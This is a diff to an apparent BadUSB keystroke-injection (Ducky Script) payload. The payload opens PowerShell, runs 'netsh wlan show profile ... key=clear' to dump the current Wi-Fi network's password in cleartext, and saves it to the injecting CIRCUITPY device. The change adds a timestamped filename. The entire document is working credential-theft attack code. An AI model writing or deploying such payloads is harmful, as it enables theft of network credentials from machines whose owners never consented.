@@ -4,7 +4,7 @@ DELAY 1000
 STRING powershell.exe 
 ENTER
 DELAY 1500
-STRING netsh wlan show profile name=(Get-NetConnectionProfile).Name[0] key=clear | Set-Content -Path (Join-Path (Get-PSDrive -Name (Get-Volume -FileSystemLabel CIRCUITPY).DriveLetter).Root "wlan.txt")
+STRING $d = Get-Date -Format "yyyyMMddHHmmss"; netsh wlan show profile name=(Get-NetConnectionProfile).Name[0] key=clear | Set-Content -Path (Join-Path (Get-PSDrive -Name (Get-Volume -FileSystemLabel CIRCUITPY).DriveLetter).Root "WLAN_$d.txt");
 DELAY 500
 ENTER
 DELAY 3500
